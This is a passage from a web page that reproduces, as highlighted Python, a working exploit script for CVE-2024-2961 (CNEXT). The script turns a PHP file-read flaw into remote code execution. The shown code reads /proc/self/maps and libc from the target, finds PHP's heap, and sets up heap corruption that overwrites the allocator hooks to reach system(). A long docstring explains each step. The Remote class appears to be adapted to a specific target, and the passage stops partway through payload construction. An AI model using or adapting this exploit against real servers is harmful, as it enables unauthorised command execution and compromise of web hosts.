an></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>(linux)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python5</span><span class="token comment">#</span><span class="token comment"># CNEXT: PHP file-read to RCE (CVE-2024-2961)</span><span class="token comment"># Date: 2024-05-27</span><span class="token comment"># Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)</span><span class="token comment">#</span><span class="token comment"># TODO Parse LIBC to know if patched</span><span class="token comment">#</span><span class="token comment"># INFORMATIONS</span><span class="token comment">#</span><span class="token comment"># To use, implement the Remote class, which tells the exploit how to send the payload.</span><span class="token comment">#</span><span class="token keyword">from</span> __future__ <span class="token keyword">import</span> annotations<span class="token keyword">import</span> base64<span class="token keyword">import</span> zlib<span class="token keyword">from</span> dataclasses <span class="token keyword">import</span> dataclass<span class="token keyword">from</span> requests<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ConnectionError<span class="token punctuation">,</span> ChunkedEncodingError<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ten <span class="token keyword">import</span> <span class="token operator">*</span>HEAP_SIZE <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span>BUG <span class="token operator">=</span> <span class="token string">"劄"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Remote</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""A helper class to send the payload and download files.        The logic of the exploit is always the same, but the exploit needs to know how to    download files (/proc/self/maps and libc) and how to send the payload.        The code here serves as an example that attacks a page that looks like:        ```php    &lt;?php        $data = file_get_contents($_POST['file']);    echo "File contents: $data";    ```        Tweak it to fit your target, and start the exploit.    """</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>url <span class="token operator">=</span> url        self<span class="token punctuation">.</span>session <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> Response<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Sends given `path` to the HTTP server. Returns the response.        """</span>        a<span class="token operator">=</span><span class="token string">"a:2:{i:0;S:1:\"/10\";i:1;i:1;}"</span>        get_params <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"exp"</span><span class="token punctuation">:</span>a<span class="token punctuation">}</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>get_params<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"filetoread"</span><span class="token punctuation">:</span> path<span class="token punctuation">}</span><span class="token punctuation">,</span>params<span class="token operator">=</span>get_params<span class="token punctuation">)</span>            <span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Returns the contents of a remote file.        """</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/convert.base64-encode/resource=</span><span class="token interpolation"><span class="token punctuation">{</span>path<span class="token punctuation">}</span></span><span class="token string">"</span></span>        response <span class="token operator">=</span> self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>path<span class="token punctuation">)</span>                <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b"File Contents: (.*)"</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>content<span class="token punctuation">,</span> flags<span class="token operator">=</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> base64<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@entry</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">,</span> <span class="token string">"Target URL"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"command"</span><span class="token punctuation">,</span> <span class="token string">"Command to run on the system; limited to 0x140 bytes"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"sleep"</span><span class="token punctuation">,</span> <span class="token string">"Time to sleep to assert that the exploit worked. By default, 1."</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"heap"</span><span class="token punctuation">,</span> <span class="token string">"Address of the main zend_mm_heap structure."</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span>    <span class="token string">"pad"</span><span class="token punctuation">,</span>    <span class="token string">"Number of 0x100 chunks to pad with. If the website makes a lot of heap "</span>    <span class="token string">"operations with this size, increase this. Defaults to 20."</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@dataclass</span><span class="token keyword">class</span> <span class="token class-name">Exploit</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""CNEXT exploit: RCE using a file read primitive in PHP."""</span>    url<span class="token punctuation">:</span> <span class="token builtin">str</span>    command<span class="token punctuation">:</span> <span class="token builtin">str</span>    sleep<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">1</span>    heap<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token boolean">None</span>    pad<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">20</span>    <span class="token keyword">def</span> <span class="token function">__post_init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>remote <span class="token operator">=</span> Remote<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>log <span class="token operator">=</span> logger<span class="token punctuation">(</span><span class="token string">"EXPLOIT"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>info <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>        self<span class="token punctuation">.</span>heap <span class="token operator">=</span> self<span class="token punctuation">.</span>heap <span class="token keyword">and</span> <span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>heap<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">check_vulnerable</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Checks whether the target is reachable and properly allows for the various        wrappers and filters that the exploit needs.        """</span>                <span class="token keyword">def</span> <span class="token function">safe_download</span><span class="token punctuation">(</span>path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>            <span class="token keyword">except</span> ConnectionError<span class="token punctuation">:</span>                failure<span class="token punctuation">(</span><span class="token string">"Target not [b]reachable[/] ?"</span><span class="token punctuation">)</span>                    <span class="token keyword">def</span> <span class="token function">check_token</span><span class="token punctuation">(</span>text<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bool</span><span class="token punctuation">:</span>            result <span class="token operator">=</span> safe_download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>            <span class="token keyword">return</span> text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> result        text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>text<span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">{</span>base64<span class="token punctuation">}</span></span><span class="token string">"</span></span>                result <span class="token operator">=</span> safe_download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>                <span class="token keyword">if</span> text <span class="token keyword">not</span> <span class="token keyword">in</span> result<span class="token punctuation">:</span>            msg_failure<span class="token punctuation">(</span><span class="token string">"Remote.download did not return the test string"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"--------------------"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Expected test string: </span><span class="token interpolation"><span class="token punctuation">{</span>text<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Got: </span><span class="token interpolation"><span class="token punctuation">{</span>result<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"--------------------"</span><span class="token punctuation">)</span>            failure<span class="token punctuation">(</span><span class="token string">"If your code works fine, it means that the [i]data://[/] wrapper does not work"</span><span class="token punctuation">)</span>        msg_info<span class="token punctuation">(</span><span class="token string">"The [i]data://[/] wrapper works"</span><span class="token punctuation">)</span>        text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter//resource=data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">{</span>base64<span class="token punctuation">}</span></span><span class="token string">"</span></span>        <span class="token keyword">if</span> <span class="token keyword">not</span> check_token<span class="token punctuation">(</span>text<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"The [i]php://filter/[/] wrapper does not work"</span><span class="token punctuation">)</span>        msg_info<span class="token punctuation">(</span><span class="token string">"The [i]php://filter/[/] wrapper works"</span><span class="token punctuation">)</span>        text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>compress<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/zlib.inflate/resource=data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">{</span>base64<span class="token punctuation">}</span></span><span class="token string">"</span></span>        <span class="token keyword">if</span> <span class="token keyword">not</span> check_token<span class="token punctuation">(</span>text<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"The [i]zlib[/] extension is not enabled"</span><span class="token punctuation">)</span>        msg_info<span class="token punctuation">(</span><span class="token string">"The [i]zlib[/] extension is enabled"</span><span class="token punctuation">)</span>        msg_success<span class="token punctuation">(</span><span class="token string">"Exploit preconditions are satisfied"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">get_file</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> msg_status<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Downloading [i]</span><span class="token interpolation"><span class="token punctuation">{</span>path<span class="token punctuation">}</span></span><span class="token string">[/]..."</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">get_regions</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Obtains the memory regions of the PHP process by querying /proc/self/maps."""</span>        maps <span class="token operator">=</span> self<span class="token punctuation">.</span>get_file<span class="token punctuation">(</span><span class="token string">"/proc/self/maps"</span><span class="token punctuation">)</span>        maps <span class="token operator">=</span> maps<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        PATTERN <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>            <span class="token string">r"^([a-f0-9]+)-([a-f0-9]+)\b"</span> <span class="token string">r".*"</span> <span class="token string">r"\s([-rwx]{3}[ps])\s"</span> <span class="token string">r"(.*)"</span>        <span class="token punctuation">)</span>        regions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> region <span class="token keyword">in</span> table<span class="token punctuation">.</span>split<span class="token punctuation">(</span>maps<span class="token punctuation">,</span> strip<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">match</span> <span class="token operator">:=</span> PATTERN<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span>region<span class="token punctuation">)</span><span class="token punctuation">:</span>                start <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>                stop <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>                permissions <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>                path <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token string">"/"</span> <span class="token keyword">in</span> path <span class="token keyword">or</span> <span class="token string">"["</span> <span class="token keyword">in</span> path<span class="token punctuation">:</span>                    path <span class="token operator">=</span> path<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    path <span class="token operator">=</span> <span class="token string">""</span>                current <span class="token operator">=</span> Region<span class="token punctuation">(</span>start<span class="token punctuation">,</span> stop<span class="token punctuation">,</span> permissions<span class="token punctuation">,</span> path<span class="token punctuation">)</span>                regions<span class="token punctuation">.</span>append<span class="token punctuation">(</span>current<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>maps<span class="token punctuation">)</span>                failure<span class="token punctuation">(</span><span class="token string">"Unable to parse memory mappings"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Got </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">len</span><span class="token punctuation">(</span>regions<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string"> memory regions"</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> regions    <span class="token keyword">def</span> <span class="token function">get_symbols_and_addresses</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Obtains useful symbols and addresses from the file read primitive."""</span>        regions <span class="token operator">=</span> self<span class="token punctuation">.</span>get_regions<span class="token punctuation">(</span><span class="token punctuation">)</span>        LIBC_FILE <span class="token operator">=</span> <span class="token string">"/dev/shm/cnext-libc"</span>        <span class="token comment"># PHP's heap</span>        self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"heap"</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>heap <span class="token keyword">or</span> self<span class="token punctuation">.</span>find_main_heap<span class="token punctuation">(</span>regions<span class="token punctuation">)</span>        <span class="token comment"># Libc</span>        libc <span class="token operator">=</span> self<span class="token punctuation">.</span>_get_region<span class="token punctuation">(</span>regions<span class="token punctuation">,</span> <span class="token string">"libc-"</span><span class="token punctuation">,</span> <span class="token string">"libc.so"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>download_file<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>path<span class="token punctuation">,</span> LIBC_FILE<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span> <span class="token operator">=</span> ELF<span class="token punctuation">(</span>LIBC_FILE<span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>address <span class="token operator">=</span> libc<span class="token punctuation">.</span>start    <span class="token keyword">def</span> <span class="token function">_get_region</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> regions<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">*</span>names<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> Region<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Returns the first region whose name matches one of the given names."""</span>        <span class="token keyword">for</span> region <span class="token keyword">in</span> regions<span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span>name <span class="token keyword">in</span> region<span class="token punctuation">.</span>path <span class="token keyword">for</span> name <span class="token keyword">in</span> names<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"Unable to locate region"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> region    <span class="token keyword">def</span> <span class="token function">download_file</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> remote_path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> local_path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Downloads `remote_path` to `local_path`"""</span>        data <span class="token operator">=</span> self<span class="token punctuation">.</span>get_file<span class="token punctuation">(</span>remote_path<span class="token punctuation">)</span>        Path<span class="token punctuation">(</span>local_path<span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">find_main_heap</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> regions<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> Region<span class="token punctuation">:</span>        <span class="token comment"># Any anonymous RW region with a size superior to the base heap size is a</span>        <span class="token comment"># candidate. The heap is at the bottom of the region.</span>        heaps <span class="token operator">=</span> <span class="token punctuation">[</span>            region<span class="token punctuation">.</span>stop <span class="token operator">-</span> HEAP_SIZE <span class="token operator">+</span> <span class="token number">0x40</span>            <span class="token keyword">for</span> region <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span>regions<span class="token punctuation">)</span>            <span class="token keyword">if</span> region<span class="token punctuation">.</span>permissions <span class="token operator">==</span> <span class="token string">"rw-p"</span>            <span class="token keyword">and</span> region<span class="token punctuation">.</span>size <span class="token operator">&gt;=</span> HEAP_SIZE            <span class="token keyword">and</span> region<span class="token punctuation">.</span>stop <span class="token operator">&amp;</span> <span class="token punctuation">(</span>HEAP_SIZE<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>            <span class="token keyword">and</span> region<span class="token punctuation">.</span>path <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"[anon:zend_alloc]"</span><span class="token punctuation">)</span>        <span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> heaps<span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"Unable to find PHP's main heap in memory"</span><span class="token punctuation">)</span>        first <span class="token operator">=</span> heaps<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>heaps<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">:</span>            heaps <span class="token operator">=</span> <span class="token string">", "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">,</span> heaps<span class="token punctuation">)</span><span class="token punctuation">)</span>            msg_info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Potential heaps: [i]</span><span class="token interpolation"><span class="token punctuation">{</span>heaps<span class="token punctuation">}</span></span><span class="token string">[/] (using first)"</span></span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            msg_info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Using [i]</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">hex</span><span class="token punctuation">(</span>first<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">[/] as heap"</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> first    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>check_vulnerable<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>get_symbols_and_addresses<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">build_exploit_path</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""On each step of the exploit, a filter will process each chunk one after the        other. Processing generally involves making some kind of operation either        on the chunk or in a destination chunk of the same size. Each operation is        applied on every single chunk; you cannot make PHP apply iconv on the first 10        chunks and leave the rest in place. That's where the difficulties come from.        Keep in mind that we know the address of the main heap, and the libraries.        ASLR/PIE do not matter here.        The idea is to use the bug to make the freelist for chunks of size 0x100 point        lower. For instance, we have the following free list:        ... -&gt; 0x7fffAABBCC900 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB00        By triggering the bug from chunk ..900, we get:        ... -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB48 -&gt; ???        That's step 3.        Now, in order to control the free list, and make it point whereever we want,        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,        we'd have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.        That's step 2.        Now, if we were to perform step2 an then step3 without anything else, we'd have        a problem: after step2 has been processed, the free list goes bottom-up, like:        0x7fffAABBCCB00 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCC900        We need to go the other way around. That's why we have step 1: it just allocates        chunks. When they get freed, they reverse the free list. Now step2 allocates in        reverse order, and therefore after step2, chunks are in the correct order.        Another problem comes up.        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.        Since step2 creates chunks that contain pointers and pointers are generally not        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.        To avoid this, we put the chunks in step2 at the very end of the chain, and        prefix them with `0\n`. When dechunked (right before the iconv), they will        "disappear" from the chain, preserving them from the character set conversion        and saving us from an unwanted processing error that would stop the processing        chain.        After step3 we have a corrupted freelist with an arbitrary pointer into it. We        don't know the precise layout of the heap, but we know that at the top of the        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.        Its free_slot[] array contains a pointer to each free list. By overwriting it,        we can make PHP allocate chunks whereever we want. In addition, its custom_heap        field contains pointers to hook functions for emalloc, efree, and erealloc        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and        then overwrite the use_custom_heap flag to make PHP use these function pointers        instead. We can now do our favorite CTF technique and get a call to        system(&lt;chunk&gt;).        We make sure that the "system" command kills the current process to avoid other        system() calls with random chunk data, leading to undefined behaviour.        The pad blocks just "pad" our allocations so that even if the heap of the        process is in a random state, we still get contiguous, in order chunks for our        exploit.        Therefore, the whole process described here CANNOT crash. Everything falls        perfectly in place, and nothing can get in the middle of our allocations.        """</span>        LIBC <span class="token operator">=</span> self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span>        ADDR_EMALLOC <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_malloc"</span><span class="token punctuation">]</span>        ADDR_EFREE <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_system"</span><span class="token punctuation">]</span>        ADDR_EREALLOC <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_realloc"</span><span class="token punctuation">]</span>        ADDR_HEAP <span class="token operator">=</span> self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"heap"</span><span class="token punctuation">]</span>        ADDR_FREE_SLOT <span class="token operator">=</span> ADDR_HEAP <span class="token operator">+</span> <span class="token number">0x20</span>        ADDR_CUSTOM_HEAP <span class="token operator">=</span> ADDR_HEAP <span class="token operator">+</span> <span class="token number">0x0168</span>        ADDR_FAKE_BIN <span class="token operator">=</span> ADDR_FREE_SLOT <span class="token operator">-</span> <span class="token number">0x10</span>        CS <span class="token operator">=</span> <span class="token number">0x100</span>        <span class="token comment"># Pad needs to stay at size 0x100 at every step</span>  